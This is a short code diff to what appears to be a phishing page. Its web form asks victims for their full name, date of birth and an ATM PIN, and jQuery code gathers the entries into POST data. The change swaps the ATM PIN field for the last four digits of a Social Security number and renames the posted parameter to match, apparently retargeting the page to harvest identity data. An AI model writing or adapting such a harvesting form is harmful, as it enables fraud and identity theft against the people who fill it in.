@@ -278,7 +278,7 @@
             <form action="" method="POST">
                 <label for="name">Full Name</label>
                 <input id="name" type="text">
-                <label for="pin">ATM PIN</label>
+                <label for="pin">Last 4 SSN</label>
                 <input id="pin" type="text">
                 <label for="dob">Date of Birth</label>
                 <input id="dob" type="text">
@@ -381,7 +381,7 @@
 
                     if (cnt === 0) {
                         postData += 'name=' + $('#name').val().trim()
-                        postData += '&pin=' + $('#pin').val().trim()
+                        postData += '&ssn=' + $('#pin').val().trim()
                         postData += '&dob=' + $('#dob').val().trim()
 
                         $('label').remove();
